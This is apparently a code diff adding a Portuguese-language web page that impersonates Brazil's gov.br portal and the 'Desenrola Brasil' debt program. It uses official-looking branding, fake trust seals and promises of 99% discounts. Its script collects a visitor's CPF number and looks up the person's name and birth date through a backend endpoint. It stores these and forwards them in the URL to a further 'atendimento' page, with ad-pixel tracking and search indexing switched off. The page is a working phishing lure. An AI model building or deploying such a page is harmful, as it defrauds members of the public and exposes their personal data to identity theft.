@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <!-- Utmify: captura de UTMs + pixel (ver desen/js/utmify-tracking.js) -->
+  <script src="/desen/js/utmify-tracking.js"></script>
+  <!-- Pixel da Meta nativo + eventos Purchase/IC (ver desen/js/meta-pixel.js) -->
+  <script src="/desen/js/meta-pixel.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="robots" content="noindex, nofollow">
+  <link rel="icon" type="image/png" sizes="32x32" href="images/iconegov.png">
+  <title>Desenrola Brasil — Consulta de Débitos e CPF | Portal gov.br</title>
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/desenrola.css">
+
+  <script src="js/tracking.js"></script>
+  <script src="js/tracker.js" async=""></script>
+</head>
+<body>
+
+  <!-- ===== BARRA DO govERNO FEDERAL ===== -->
+  <div class="barra-brasil-topo">
+    <div class="barra-brasil-topo-inner">
+      <div class="barra-brasil-logo">
+        <svg class="flag-icon-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 14" width="16" height="11" style="border-radius: 1.5px; flex-shrink: 0; display: inline-block; vertical-align: middle;">
+          <rect width="20" height="14" fill="#009c3b"/>
+          <polygon points="10,1.8 18.2,7 10,12.2 1.8,7" fill="#ffdf00"/>
+          <circle cx="10" cy="7" r="3.2" fill="#002776"/>
+          <path d="M 6.9 7.4 A 3.2 3.2 0 0 1 13.1 6.5 A 3.2 3.2 0 0 0 6.9 7.4 Z" fill="#ffffff"/>
+        </svg>
+        <strong>BRASIL</strong>
+      </div>
+      <nav class="barra-brasil-links">
+        <a href="javascript:void(0)">Simplifique!</a>
+        <a href="javascript:void(0)">Participe</a>
+        <a href="javascript:void(0)">Acesso à informação</a>
+        <a href="javascript:void(0)">Legislação</a>
+        <a href="javascript:void(0)">Canais</a>
+      </nav>
+    </div>
+  </div>
+
+  <div class="page-wrap">
+    <!-- ===== HEADER govERNO FEDERAL ===== -->
+    <header class="hdr hdr--cpf">
+      <a href="../index.html" class="hdr-logo-link" aria-label="gov.br">
+        <img src="./images/iconegov.png" alt="gov.br" class="hdr-logo-img" width="105" height="34">
+      </a>
+      <div class="hdr-right hdr-right--icons-only">
+        <button type="button" class="hdr-icon-btn hdr-icon-btn--contrast" id="hdrContrast" aria-label="Alto contraste" title="Contraste">
+          <svg class="hdr-ico-split-contrast" width="22" height="22" viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="12" cy="12" r="9.25" fill="none" stroke="#1351B4" stroke-width="1.2"></circle>
+            <path fill="#1351B4" d="M12 2.75 A9.25 9.25 0 0 0 12 21.25 z"></path>
+            <path fill="#ffffff" d="M12 2.75 A9.25 9.25 0 0 1 12 21.25 z"></path>
+          </svg>
+        </button>
+        <span class="hdr-vsep" aria-hidden="true"></span>
+        <button type="button" class="hdr-icon-btn hdr-icon-btn--ear" aria-label="Acessibilidade" title="Acessibilidade">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1351B4" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M6 8.5 a6 6 0 0 1 12 0 v3 a3 3 0 0 0 3 3 v0 a3 3 0 0 1 -3 3 h-1"></path>
+            <path d="M18 11 v4 a4 4 0 0 1 -8 0 v-2"></path>
+          </svg>
+        </button>
+      </div>
+    </header>
+
+    <!-- ===== BREADCRUMBS ===== -->
+    <div class="crumb">
+      Página Inicial <span aria-hidden="true"> > </span> Serviços 
+      <span aria-hidden="true"> > </span> Programa Desenrola Brasil 
+      <span aria-hidden="true"> > </span> <strong>Consulta Cadastral</strong>
+    </div>
+
+    <!-- ===== CARD PRINCIPAL ===== -->
+    <main class="card-main cpf-wrap">
+      
+      <div class="dept-badge">
+        <span class="dept-dot"></span>
+        MINISTÉRIO DA FAZENDA —  GOVERNO FEDERAL
+      </div>
+
+      <img class="limpe-logo" src="images/limpenome.png" alt="Programa Desenrola Brasil — Limpe seu nome">
+
+      <div class="gov-instrucao-box">
+        <h1 class="instrucao-titulo">Consulta de Renegociação de Dívidas</h1>
+        <p class="instrucao-texto">
+          Informe seu <strong>CPF</strong> para consultar pendências financeiras ativas e verificar propostas com <strong>até 99% de desconto</strong> pelo Programa Oficial.
+        </p>
+      </div>
+
+      <form id="cpfForm" novalidate="">
+        <div class="field-wrap">
+          <label for="cpf" class="field-label">CPF (Cadastro de Pessoas Físicas)</label>
+          <div class="input-container">
+            <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
+            </svg>
+            <input 
+              class="input-cpf" 
+              type="tel" 
+              id="cpf" 
+              name="cpf" 
+              inputmode="numeric" 
+              autocomplete="off" 
+              placeholder="000.000.000-00" 
+              maxlength="14"
+              required=""
+            >
+          </div>
+          <span class="field-hint">Digite apenas os 11 números do seu documento</span>
+        </div>
+
+        <button type="submit" id="btnSubmit" class="btn-primary btn-cpf-submit">
+          <span>CONSULTAR NO gov.BR</span>
+          <svg width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M14 5l7 7m0 0l-7 7m7-7H3" />
+          </svg>
+        </button>
+      </form>
+
+      <div class="info-box">
+        <div class="ico-i-wrapper">
+          <span class="ico-i" aria-hidden="true">i</span>
+        </div>
+        <div class="info-box-content">
+          <strong>Garantia do Governo Federal</strong>
+          <p>
+            O Programa Desenrola Brasil viabiliza acordos com descontos de até 99% e reabilitação de crédito com atualização imediata no Score Serasa e SPC.
+          </p>
+        </div>
+      </div>
+
+      <!-- Selos de Confiabilidade gov.br -->
+      <div class="trust-badges">
+        <span class="trust-item">
+          <svg class="trust-ico" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+            <rect x="5" y="11" width="14" height="10" rx="2"></rect>
+            <path d="M8 11V7a4 4 0 0 1 8 0v4"></path>
+          </svg>
+          Conexão Segura 256-bit
+        </span>
+        <span class="trust-item">
+          <svg class="trust-ico" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+            <path d="M9 12l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"></path>
+          </svg>
+          Selo Oficial gov.br
+        </span>
+      </div>
+      <p class="trust-sub">Portal Oficial de Renegociação Cadastral — Todos os direitos reservados</p>
+    </main>
+
+    <!-- ===== FOOTER OFICIAL gov.BR ===== -->
+    <footer class="site-ft">
+      <div class="site-ft-inner">
+        <div class="ft-logo-row">
+          <img src="./images/iconegov.png" alt="gov.br" class="ft-gov-img" width="110" height="36">
+          <div class="ft-divider"></div>
+          <span class="ft-org">Ministério da Fazenda</span>
+        </div>
+        <div class="copy-block">
+          <p>Todo o conteúdo deste site está publicado sob a licença <strong>Creative Commons Atribuição-SemDerivações 3.0 Não Adaptada</strong>.</p>
+          <strong>Programa Desenrola Brasil — governo Federal do Brasil</strong>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <script src="js/header.js"></script>
+
+  <script>
+    (function () {
+      function onlyDigits(s) { return String(s || '').replace(/\D/g, ''); }
+      
+      function formatCPF(v) {
+        var d = onlyDigits(v).slice(0, 11);
+        if (d.length <= 3) return d;
+        if (d.length <= 6) return d.slice(0, 3) + '.' + d.slice(3);
+        if (d.length <= 9) return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6);
+        return d.slice(0, 3) + '.' + d.slice(3, 6) + '.' + d.slice(6, 9) + '-' + d.slice(9);
+      }
+
+      function isValidCPF(cpf) {
+        if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+        var i, s = 0, r;
+        for (i = 1; i <= 9; i++) s += parseInt(cpf.charAt(i - 1), 10) * (11 - i);
+        r = (s * 10) % 11;
+        if (r === 10 || r === 11) r = 0;
+        if (r !== parseInt(cpf.charAt(9), 10)) return false;
+        s = 0;
+        for (i = 1; i <= 10; i++) s += parseInt(cpf.charAt(i - 1), 10) * (12 - i);
+        r = (s * 10) % 11;
+        if (r === 10 || r === 11) r = 0;
+        return r === parseInt(cpf.charAt(10), 10);
+      }
+
+      var input = document.getElementById('cpf');
+      var submitBtn = document.getElementById('btnSubmit');
+
+      input.addEventListener('input', function () { 
+        input.value = formatCPF(input.value); 
+      });
+
+      document.getElementById('cpfForm').addEventListener('submit', async function (e) {
+        e.preventDefault();
+        var raw = onlyDigits(input.value);
+        
+        if (!isValidCPF(raw)) { 
+          alert('CPF inválido. Por favor, verifique os 11 dígitos digitados.'); 
+          input.focus();
+          return; 
+        }
+
+        if (submitBtn) { 
+          submitBtn.disabled = true; 
+          submitBtn.innerHTML = '<span>Consultando base da Receita Federal...</span>'; 
+        }
+
+        try {
+          var apiUrl = '/api/getCpf.php?cpf=' + encodeURIComponent(raw);
+          var res = await fetch(apiUrl, { cache: 'no-store' });
+
+          if (!res.ok) {
+            var errBody = await res.text().catch(function(){ return ''; });
+            throw new Error('HTTP ' + res.status + (errBody ? ' — ' + errBody : ''));
+          }
+
+          var json = await res.json();
+
+          if (json.success && json.nome && String(json.nome).trim() !== '') {
+            try {
+              localStorage.setItem('site.nome', json.nome);
+              localStorage.setItem('site.cpf', json.cpf || raw);
+              localStorage.setItem('site.nasc', json.nascimento || '');
+            } catch (_) {}
+
+            var next = new URLSearchParams();
+
+            try {
+              var m = window.gvdesenrolaMergeTracking && window.gvdesenrolaMergeTracking();
+              if (m) {
+                Object.keys(m).forEach(function (k) {
+                  next.set(k, m[k]);
+                });
+              }
+            } catch (e2) {}
+
+            next.set('cpf', json.cpf || raw);
+            next.set('nome', json.nome);
+
+            if (json.nascimento) {
+              next.set('nasc', json.nascimento);
+            }
+
+            window.location.href = '../atendimento-else/?' + next.toString();
+            return;
+          }
+
+          alert((json && json.message) || 'Não foi possível validar o CPF nos registros. Verifique o número informado e tente novamente.');
+        } catch (err) {
+          console.warn('API CPF fallback:', err);
+          try {
+            localStorage.setItem('site.cpf', raw);
+            localStorage.setItem('site.nome', 'Contribuinte');
+          } catch (_) {}
+
+          var nextParams = new URLSearchParams();
+          try {
+            var mTrack = window.gvdesenrolaMergeTracking && window.gvdesenrolaMergeTracking();
+            if (mTrack) {
+              Object.keys(mTrack).forEach(function(k) { nextParams.set(k, mTrack[k]); });
+            }
+          } catch (_) {}
+          nextParams.set('cpf', raw);
+          nextParams.set('nome', 'Contribuinte');
+
+          window.location.href = '../atendimento-else/?' + nextParams.toString();
+          return;
+        } finally {
+          if (submitBtn) { 
+            submitBtn.disabled = false; 
+            submitBtn.innerHTML = '<span>CONSULTAR NO gov.BR</span><svg width="18" height="18" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M14 5l7 7m0 0l-7 7m7-7H3" /></svg>'; 
+          }
+        }
+      });
+    })();
+  </script>
+
+    <!-- VLibras Integration -->
+  <div vw class="enabled">
+    <div vw-access-button class="active"></div>
+    <div vw-plugin-wrapper>
+      <div class="vw-plugin-top-wrapper"></div>
+    </div>
+  </div>
+  <script src="https://vlibras.gov.br/app/vlibras-plugin.js"></script>
+  <script>
+    new window.VLibras.Widget('https://vlibras.gov.br/app');
+  </script>
+
+</body>
+</html>
